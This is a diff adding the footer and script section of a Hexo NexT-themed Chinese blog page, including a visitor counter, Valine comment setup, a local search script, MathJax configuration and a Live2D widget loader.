+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">206k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">3:08</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.0.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <script id="ribbon" size="200" alpha="0.3" zindex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.0"></script>
+
+  <script src="/js/src/motion.js?v=7.0.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.0"></script>
+<script src="/js/src/post-details.js?v=7.0.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=7.0.0"></script>
+
+
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: true,
+    appId: 'uxxXkzDF0R4FFwG4j5rxjPHA-gzGzoHsz',
+    appKey: 'bUp11H8Kr3o92XHiSuaLEAqt',
+    placeholder: 'Do you want to say anything?',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+    
+      <script type="text/x-mathjax-config">
+  
+
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      
+      equationNumbers: {
+        autoNumber: "AMS"
+      }
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+      for (i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+<script src="//cdn.jsdelivr.net/npm/mathjax@2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+<style>
+.MathJax_Display {
+  overflow: auto hidden;
+}
+</style>
+
+    
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
